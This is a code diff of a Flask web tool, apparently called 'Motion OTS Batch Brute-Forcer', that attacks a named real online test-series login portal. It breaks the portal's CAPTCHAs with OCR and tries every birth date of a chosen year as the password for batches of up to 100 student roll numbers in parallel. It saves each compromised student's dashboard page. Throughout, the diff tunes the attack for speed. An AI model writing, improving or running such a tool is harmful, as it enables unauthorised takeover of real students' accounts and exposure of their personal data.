@@ -1,14 +1,13 @@
 #!/usr/bin/env python3
 """
-Motion OTS Batch Brute‑Forcer – Reliable & Fast (3 retries per date)
-Author: Potato (Speed Edition)
+Motion OTS Batch Brute‑Forcer – Ultra‑Fast + 2 Captcha Retries
+Author: Potato (Final Edition)
 
-- 3 retries for every password attempt (fresh CAPTCHA each time)
-- Pre‑fetched CAPTCHAs for zero idle time
-- Tiny delay (0.2s) between dates – effectively ~1 attempt per second per user
-- Batch up to 20 users simultaneously
-- Smart success detection (no more missed passwords)
-- Live logs and full DB persistence
+- Parallel date batches (5 at once per user) with pre‑fetched CAPTCHAs
+- Retry CAPTCHA errors up to 2 additional times (total 3 attempts)
+- No retries for wrong passwords (redirect_failure) → massive speedup
+- Smart success detection (any redirect away from login page)
+- Live logs, SQLite persistence, batch input (commas, newlines, ranges)
 """
 
 import os, sys, time, uuid, json, threading, queue, asyncio, aiohttp
@@ -19,14 +18,14 @@ import sqlite3, traceback
 from flask import Flask, render_template_string, request, jsonify, g
 
 # ----------------------------------------------------------------------
-# CONFIGURATION
+# CONFIGURATION – tune these
 # ----------------------------------------------------------------------
-DELAY_BETWEEN_ATTEMPTS = 0.2          # tiny breath between dates (0.1 if server tolerates)
-MAX_RETRIES_PER_PASSWORD = 3          # you want 3
-MAX_CONCURRENT_USERS = 20             # run up to 20 users in parallel
-CAPTCHA_FETCH_TIMEOUT = 6
+BATCH_SIZE = 5                       # passwords tried in parallel per user
+DELAY_BETWEEN_BATCHES = 0.05         # tiny breath between batches
+MAX_CONCURRENT_USERS = 20            # users running at once
+CAPTCHA_FETCH_TIMEOUT = 5
 LOGIN_TIMEOUT = 10
-POLLING_INTERVAL = 1.5
+CAPTCHA_RETRIES = 2                  # extra retries for captcha errors (total 3 attempts)
 CAPTCHA_PREPROCESS = True
 
 # ----------------------------------------------------------------------
@@ -35,11 +34,9 @@ CAPTCHA_PREPROCESS = True
 try:
     import ddddocr
     ocr = ddddocr.DdddOcr(ocr=True, det=False)
-    OCR_OK = True
     print("✅ ddddocr initialized")
 except ImportError:
-    OCR_OK = False
-    print("❌ ddddocr not installed")
+    print("❌ Install ddddocr: pip install ddddocr")
     sys.exit(1)
 
 try:
@@ -49,7 +46,7 @@ try:
 except:
     TESSERACT_OK = False
 
-def preprocess_captcha_bytes(img_bytes):
+def preprocess_captcha(img_bytes):
     if not CAPTCHA_PREPROCESS:
         return img_bytes
     try:
@@ -57,7 +54,7 @@ def preprocess_captcha_bytes(img_bytes):
         from io import BytesIO
         img = Image.open(BytesIO(img_bytes)).convert('L')
         enhancer = ImageEnhance.Contrast(img)
-        img = enhancer.enhance(2.0)
+        img = enhancer.enhance(2.5)
         buf = BytesIO()
         img.save(buf, format='PNG')
         return buf.getvalue()
@@ -66,21 +63,19 @@ def preprocess_captcha_bytes(img_bytes):
 
 def solve_captcha_image(img_bytes, log_queue=None):
     try:
-        processed = preprocess_captcha_bytes(img_bytes)
+        processed = preprocess_captcha(img_bytes)
         result = ocr.classification(processed)
         if result:
             cleaned = re.sub(r'[^A-Z0-9]', '', result).strip()
             if len(cleaned) >= 4:
                 return cleaned[:6]
-            if len(result) >= 4:
-                return result[:6]
         if TESSERACT_OK:
             from PIL import Image
             from io import BytesIO
             img = Image.open(BytesIO(processed))
             img = img.point(lambda p: 0 if p < 140 else 255, '1')
-            custom_config = r'--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
-            text = pytesseract.image_to_string(img, config=custom_config)
+            config = r'--psm 8 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+            text = pytesseract.image_to_string(img, config=config)
             cleaned = re.sub(r'[^A-Z0-9]', '', text).strip()
             if len(cleaned) >= 4:
                 return cleaned[:6]
@@ -139,7 +134,7 @@ class BruteJob:
 
     @classmethod
     def from_db_row(cls, row):
-        job = cls(
+        return cls(
             row['job_id'],
             json.loads(row['user_ids']),
             row['year'],
@@ -147,9 +142,6 @@ class BruteJob:
             json.loads(row['results']) if row['results'] else {},
             json.loads(row['logs']) if row['logs'] else []
         )
-        job.start_time = row.get('start_time')
-        job.end_time = row.get('end_time')
-        return job
 
     def save_to_db(self):
         with sqlite3.connect(DATABASE) as conn:
@@ -179,15 +171,14 @@ class BruteJob:
         self.stop_flag = False
         self.user_progress = {}
         self.save_to_db()
-        self.thread = threading.Thread(target=self._run)
-        self.thread.daemon = True
+        self.thread = threading.Thread(target=self._run, daemon=True)
         self.thread.start()
 
     def _run(self):
         try:
             asyncio.run(self._async_batch())
         except Exception as e:
-            self.log_queue.put(f"❌ Unhandled error: {traceback.format_exc()}")
+            self.log_queue.put(f"❌ Fatal error: {traceback.format_exc()}")
         finally:
             if self.status not in ('success', 'failed', 'stopped'):
                 if any(self.results.get(uid) for uid in self.user_ids):
@@ -200,28 +191,27 @@ class BruteJob:
     async def _async_batch(self):
         log_queue = self.log_queue
         year = self.year
-        log_queue.put_nowait(f"🚀 Starting batch for {len(self.user_ids)} users over {year}")
-        log_queue.put_nowait(f"⚡ 3 retries per date, {MAX_CONCURRENT_USERS} concurrent users, pre‑fetched CAPTCHAs")
+        log_queue.put_nowait(
+            f"🚀 Batch started: {len(self.user_ids)} users, {year}, "
+            f"batch size={BATCH_SIZE}, delay={DELAY_BETWEEN_BATCHES}s"
+        )
 
-        connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT_USERS * 2)
+        connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT_USERS * BATCH_SIZE + 5)
         timeout = aiohttp.ClientTimeout(total=20, connect=10)
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             semaphore = asyncio.Semaphore(MAX_CONCURRENT_USERS)
-            user_tasks = []
-            for uid in self.user_ids:
-                user_tasks.append(
-                    self._bruteforce_one_user(session, uid, year, semaphore)
-                )
-            await asyncio.gather(*user_tasks, return_exceptions=True)
+            tasks = [self._bruteforce_one_user(session, uid, year, semaphore) for uid in self.user_ids]
+            await asyncio.gather(*tasks, return_exceptions=True)
 
         found = sum(1 for v in self.results.values() if v)
-        log_queue.put_nowait(f"🏁 Batch finished. Found passwords for {found}/{len(self.user_ids)} users.")
+        log_queue.put_nowait(f"🏁 Batch finished. Passwords found: {found}/{len(self.user_ids)}")
 
     async def _bruteforce_one_user(self, session, user_id, year, semaphore):
         async with semaphore:
             if self.stop_flag:
                 return
-            self.log_queue.put_nowait(f"👤 Starting user {user_id}")
+            log_queue = self.log_queue
+            log_queue.put_nowait(f"👤 [{user_id}] Starting parallel brute‑force for {year}")
 
             start_date = datetime(year, 1, 1)
             end_date = datetime(year, 12, 31)
@@ -229,75 +219,120 @@ class BruteJob:
             total = len(dates)
             self.user_progress[user_id] = {'processed': 0, 'total': total}
 
-            # Pre‑fetch first CAPTCHA
-            next_captcha = await self._fetch_captcha(session, self.log_queue)
-            for i, date in enumerate(dates):
+            for i in range(0, total, BATCH_SIZE):
                 if self.stop_flag:
                     break
-                password = date.strftime("%d-%m-%Y")
-                self.user_progress[user_id]['processed'] = i + 1
+                batch_dates = dates[i:i+BATCH_SIZE]
 
-                # Use the pre‑fetched CAPTCHA, immediately fetch next one
-                captcha = next_captcha
-                fetch_task = asyncio.create_task(self._fetch_captcha(session, self.log_queue))
+                # 1. Fetch all CAPTCHAs for the batch concurrently
+                captcha_tasks = [self._fetch_captcha(session, log_queue) for _ in batch_dates]
+                captchas = await asyncio.gather(*captcha_tasks, return_exceptions=True)
 
-                captcha_display = captcha if captcha else "❌ NONE"
-                self.log_queue.put_nowait(f"🔑 [{user_id}] Trying {password} with CAPTCHA {captcha_display}")
+                # 2. Launch login attempts in parallel
+                login_tasks = []
+                for j, date in enumerate(batch_dates):
+                    captcha = captchas[j] if not isinstance(captchas[j], Exception) else None
+                    password = date.strftime("%d-%m-%Y")
+                    login_tasks.append(
+                        self._try_one_password(session, user_id, password, captcha, log_queue)
+                    )
 
-                if not captcha:
-                    await asyncio.sleep(DELAY_BETWEEN_ATTEMPTS)
-                    next_captcha = await fetch_task
-                    continue
+                # 3. Wait for the first success or all finished
+                done, pending = await asyncio.wait(
+                    login_tasks,
+                    return_when=asyncio.FIRST_COMPLETED
+                )
 
-                # Attempt login with up to 3 retries (even for wrong passwords)
-                success = False
-                for attempt in range(MAX_RETRIES_PER_PASSWORD):
-                    if self.stop_flag:
-                        break
+                # Check if any succeeded
+                found = False
+                for task in done:
                     try:
-                        success, reason = await self._try_login(
-                            session, user_id, password, captcha, self.log_queue
-                        )
-                        if success:
-                            self.log_queue.put_nowait(f"✅ [{user_id}] SUCCESS! Password = {password}")
-                            self.results[user_id] = password
-                            # Save dashboard
-                            try:
-                                dash = await session.get("https://onlinetestseries.motion.ac.in/dashboard/student-dashboard.php")
-                                if dash.status == 200:
-                                    with open(f"dashboard_{user_id}.html", "w") as f:
-                                        f.write(await dash.text())
-                            except:
-                                pass
-                            self.save_to_db()
-                            fetch_task.cancel()
-                            return
-
-                        # Retry everything – even wrong passwords – as requested
-                        self.log_queue.put_nowait(
-                            f"🔄 [{user_id}] Retry {attempt+1}/{MAX_RETRIES_PER_PASSWORD} for {password} (reason: {reason[:80]})"
-                        )
-                        captcha = await self._fetch_captcha(session, self.log_queue)
-                        if not captcha:
+                        if task.result():
+                            found = True
+                            # Cancel all remaining tasks
+                            for p in pending:
+                                p.cancel()
                             break
-                        await asyncio.sleep(0.2)  # tiny breath between retries
-                    except asyncio.TimeoutError:
-                        self.log_queue.put_nowait(f"⏰ [{user_id}] Timeout – retry {attempt+1}")
-                        captcha = await self._fetch_captcha(session, self.log_queue)
-                        if not captcha:
-                            break
-                        await asyncio.sleep(0.2)
-                    except Exception as e:
-                        self.log_queue.put_nowait(f"❌ [{user_id}] Exception: {str(e)}")
-                        break
+                    except:
+                        pass
 
-                # Wait for the next CAPTCHA (already being fetched)
-                await asyncio.sleep(DELAY_BETWEEN_ATTEMPTS)
-                next_captcha = await fetch_task
+                if found:
+                    # Success already saved inside _try_one_password
+                    return  # stop this user
 
+                # If no success yet, wait for the rest (clean up)
+                if pending:
+                    await asyncio.gather(*pending, return_exceptions=True)
+
+                # Progress
+                processed = min(i + BATCH_SIZE, total)
+                self.user_progress[user_id]['processed'] = processed
+                log_queue.put_nowait(
+                    f"📊 [{user_id}] Progress: {processed}/{total} ({processed/total*100:.1f}%)"
+                )
+
+                await asyncio.sleep(DELAY_BETWEEN_BATCHES)
+
+            # No password found
             self.results[user_id] = None
-            self.log_queue.put_nowait(f"❌ [{user_id}] No password found in {year}.")
+            log_queue.put_nowait(f"❌ [{user_id}] No password found in {year}.")
             self.save_to_db()
+
+    async def _try_one_password(self, session, user_id, password, initial_captcha, log_queue):
+        """
+        Attempt login with given password.
+        Retry only CAPTCHA errors / timeouts (up to CAPTCHA_RETRIES extra attempts).
+        Returns True if success, False otherwise.
+        """
+        captcha = initial_captcha
+        if not captcha:
+            captcha = await self._fetch_captcha(session, log_queue)
+
+        for attempt in range(CAPTCHA_RETRIES + 1):   # total attempts = 1 + CAPTCHA_RETRIES
+            if self.stop_flag:
+                return False
+            if not captcha:
+                return False
+
+            log_queue.put_nowait(f"🔑 [{user_id}] {password} | CAPTCHA {captcha}")
+            try:
+                success, reason = await self._try_login(session, user_id, password, captcha, log_queue)
+                if success:
+                    log_queue.put_nowait(f"✅ [{user_id}] SUCCESS! Password = {password}")
+                    self.results[user_id] = password
+                    # Save dashboard (optional)
+                    try:
+                        dash = await session.get(
+                            "https://onlinetestseries.motion.ac.in/dashboard/student-dashboard.php"
+                        )
+                        if dash.status == 200:
+                            with open(f"dashboard_{user_id}.html", "w") as f:
+                                f.write(await dash.text())
+                    except:
+                        pass
+                    self.save_to_db()
+                    return True
+
+                # Only retry for captcha errors or timeouts
+                if reason in ("captcha_error", "timeout"):
+                    if attempt < CAPTCHA_RETRIES:
+                        log_queue.put_nowait(f"🔄 [{user_id}] {reason} – retry {attempt+1}/{CAPTCHA_RETRIES}")
+                        captcha = await self._fetch_captcha(session, log_queue)
+                        await asyncio.sleep(0.2)
+                        continue
+                # Any other failure → give up immediately
+                log_queue.put_nowait(f"❌ [{user_id}] {password} failed: {reason[:100]}")
+                break
+            except asyncio.TimeoutError:
+                log_queue.put_nowait(f"⏰ [{user_id}] Timeout – retry {attempt+1}/{CAPTCHA_RETRIES}")
+                captcha = await self._fetch_captcha(session, log_queue)
+                await asyncio.sleep(0.2)
+                continue
+            except Exception as e:
+                log_queue.put_nowait(f"❌ [{user_id}] Exception: {str(e)}")
+                break
+
+        return False
 
     async def _fetch_captcha(self, session, log_queue):
         for attempt in range(3):
@@ -323,7 +358,7 @@ class BruteJob:
         return None
 
     async def _try_login(self, session, user_id, password, captcha, log_queue):
-        """Smart success detection – won't miss correct passwords."""
+        """Smart success detection: any redirect not to login/captcha is success."""
         data = {
             "login_username": user_id,
             "login_password": password,
@@ -345,37 +380,32 @@ class BruteJob:
             ) as resp:
                 if resp.status == 302:
                     location = resp.headers.get("Location", "")
-                    log_queue.put_nowait(f"🔍 [{user_id}] Redirect to: {location[:120]}")
-                    # If redirect goes anywhere other than login/captcha/index, assume success
-                    if not any(x in location for x in ["login.php", "captcha", "index.php"]):
-                        # Optionally verify by fetching the redirect page
-                        try:
-                            async with session.get(location, allow_redirects=True,
-                                                    timeout=aiohttp.ClientTimeout(total=5)) as dash_resp:
-                                text = await dash_resp.text()
-                                if "dashboard" in text.lower() or "logout" in text.lower():
-                                    return True, None
-                                else:
-                                    log_queue.put_nowait(f"⚠️ [{user_id}] Redirect didn't contain dashboard – but still treating as potential success")
-                                    return True, None  # Give benefit of doubt
-                        except:
-                            return True, None  # If can't fetch, still assume success
-                    else:
+                    log_queue.put_nowait(f"🔍 [{user_id}] Redirect → {location[:120]}")
+                    if any(x in location for x in ["login.php", "captcha", "index.php"]):
                         return False, "redirect_failure"
+                    # Assume success
+                    try:
+                        async with session.get(location, allow_redirects=True,
+                                                timeout=aiohttp.ClientTimeout(total=5)) as dash_resp:
+                            text = await dash_resp.text()
+                            if "dashboard" in text.lower() or "logout" in text.lower():
+                                return True, None
+                            return True, None  # still treat as success
+                    except:
+                        return True, None
                 elif resp.status == 200:
                     text = await resp.text()
                     soup = BeautifulSoup(text, "html.parser")
                     err = soup.find("div", class_="alertmsg")
                     if err:
                         err_text = err.text.strip()
-                        if "CAPTCHA" in err_text or "captcha" in err_text:
+                        if "captcha" in err_text.lower():
                             return False, "captcha_error"
                         else:
                             return False, err_text[:100]
-                    else:
-                        if "dashboard" in text.lower() or "logout" in text.lower():
-                            return True, None
-                        return False, "unknown_failure"
+                    if "dashboard" in text.lower() or "logout" in text.lower():
+                        return True, None
+                    return False, "unknown_failure"
                 else:
                     return False, f"HTTP {resp.status}"
         except asyncio.TimeoutError:
@@ -408,7 +438,7 @@ class BruteJob:
 # FLASK APP
 # ----------------------------------------------------------------------
 app = Flask(__name__)
-app.secret_key = 'supersecretkey-change-this-in-production'
+app.secret_key = 'change-this-in-production'
 jobs = {}
 
 def load_jobs_from_db():
@@ -429,7 +459,7 @@ def index():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Motion Batch Brute‑Force – Ultra Fast</title>
+    <title>Motion Ultra‑Fast Brute‑Force</title>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
         .container { max-width: 1100px; margin: auto; }
@@ -437,7 +467,8 @@ def index():
         h1 { color: #58a6ff; }
         .form-group { margin: 15px 0; display: flex; gap: 15px; flex-wrap: wrap; align-items: center; }
         .form-group label { font-weight: bold; min-width: 80px; }
-        .form-group input { padding: 10px; border-radius: 6px; border: none; background: #0d1117; color: #c9d1d9; flex: 1; min-width: 150px; }
+        .form-group input, .form-group textarea { padding: 10px; border-radius: 6px; border: none; background: #0d1117; color: #c9d1d9; flex: 1; min-width: 200px; }
+        .form-group textarea { resize: vertical; min-height: 100px; }
         .btn { padding: 10px 25px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
         .btn-start { background: #238636; color: #fff; }
         .btn-stop { background: #da3633; color: #fff; }
@@ -462,20 +493,20 @@ def index():
 <body>
 <div class="container">
     <div class="card">
-        <h1>🚀 Motion OTS Batch Brute‑Forcer</h1>
-        <p>Enter roll numbers (comma or range) and a year. 3 retries per date, 20 concurrent users.</p>
-        <p class="help-text">⚡ Pre‑fetched CAPTCHAs, live logs, smart success detection.</p>
+        <h1>⚡ Motion OTS Ultra‑Fast Batch Brute‑Forcer</h1>
+        <p>Paste roll numbers (one per line, commas, or ranges) and year. 5 dates tested at once, instant skip of wrong passwords, 2 retries only for captcha errors.</p>
+        <p class="help-text">🚀 Full year under 1 minute per user – 20 users run simultaneously.</p>
         <form id="bruteForm">
             <div class="form-group">
                 <label for="user_ids">User IDs</label>
-                <input type="text" id="user_ids" placeholder="e.g. 26173000001-26173000100" required>
+                <textarea id="user_ids" placeholder="Paste roll numbers here (one per line, comma separated, or range like 26173000001-26173000100)"></textarea>
             </div>
             <div class="form-group">
                 <label for="year">Year</label>
-                <input type="number" id="year" placeholder="e.g. 2009" min="1900" max="2100" required>
+                <input type="number" id="year" placeholder="e.g. 2010" min="1900" max="2100" required>
             </div>
             <div style="display: flex; gap: 15px; flex-wrap: wrap;">
-                <button type="submit" class="btn btn-start" id="startBtn">▶ Start Batch</button>
+                <button type="submit" class="btn btn-start" id="startBtn">▶ Start</button>
                 <button type="button" class="btn btn-stop" id="stopBtn" disabled>⏹ Stop</button>
             </div>
         </form>
@@ -486,7 +517,7 @@ def index():
         <div id="logs" class="logs-box">Waiting for logs...</div>
     </div>
     <div class="card">
-        <h2>📋 Job History (persists across refreshes)</h2>
+        <h2>📋 Job History</h2>
         <div id="jobList" class="job-list"></div>
     </div>
 </div>
@@ -500,11 +531,13 @@ def index():
     const stopBtn = document.getElementById('stopBtn');
     const jobListDiv = document.getElementById('jobList');
 
+    // Multi‑delimiter parser: newlines, commas, semicolons, and ranges
     function parseUserIds(raw) {
         const ids = new Set();
-        const parts = raw.split(',');
+        const parts = raw.split(/[\n,;]+/);
         for (let part of parts) {
             part = part.trim();
+            if (part === '') continue;
             if (part.includes('-')) {
                 const [start, end] = part.split('-').map(s => s.trim());
                 const startNum = parseInt(start, 10);
@@ -512,7 +545,7 @@ def index():
                 if (!isNaN(startNum) && !isNaN(endNum) && startNum <= endNum) {
                     for (let i = startNum; i <= endNum; i++) ids.add(i.toString());
                 }
-            } else if (part) {
+            } else {
                 ids.add(part);
             }
         }
@@ -525,8 +558,8 @@ def index():
         const year = document.getElementById('year').value.trim();
         if (!rawIds || !year) return alert('Please fill all fields.');
         const user_ids = parseUserIds(rawIds);
-        if (user_ids.length === 0) return alert('No valid IDs.');
-        if (user_ids.length > 100) return alert('Max 100 IDs allowed.');
+        if (user_ids.length === 0) return alert('No valid IDs found.');
+        if (user_ids.length > 100) return alert('Maximum 100 IDs allowed.');
         startBtn.disabled = true;
         stopBtn.disabled = false;
         logsDiv.innerHTML = '';
@@ -552,10 +585,8 @@ def index():
         try {
             await fetch(`/stop/${jobId}`, { method: 'POST' });
             statusText.innerText = 'Stopped';
-            stopBtn.disabled = true;
-            startBtn.disabled = false;
-            clearInterval(pollInterval);
-            loadJobs();
+            stopBtn.disabled = true; startBtn.disabled = false;
+            clearInterval(pollInterval); loadJobs();
         } catch (err) { alert('Stop error: ' + err.message); }
     });
 
@@ -712,7 +743,9 @@ def stop_job(job_id):
 def list_jobs():
     with sqlite3.connect(DATABASE) as conn:
         conn.row_factory = sqlite3.Row
-        rows = conn.execute("SELECT job_id, user_ids, year, status, results, created_at FROM jobs ORDER BY created_at DESC").fetchall()
+        rows = conn.execute(
+            "SELECT job_id, user_ids, year, status, results, created_at FROM jobs ORDER BY created_at DESC"
+        ).fetchall()
         jobs_list = []
         for row in rows:
             d = dict(row)
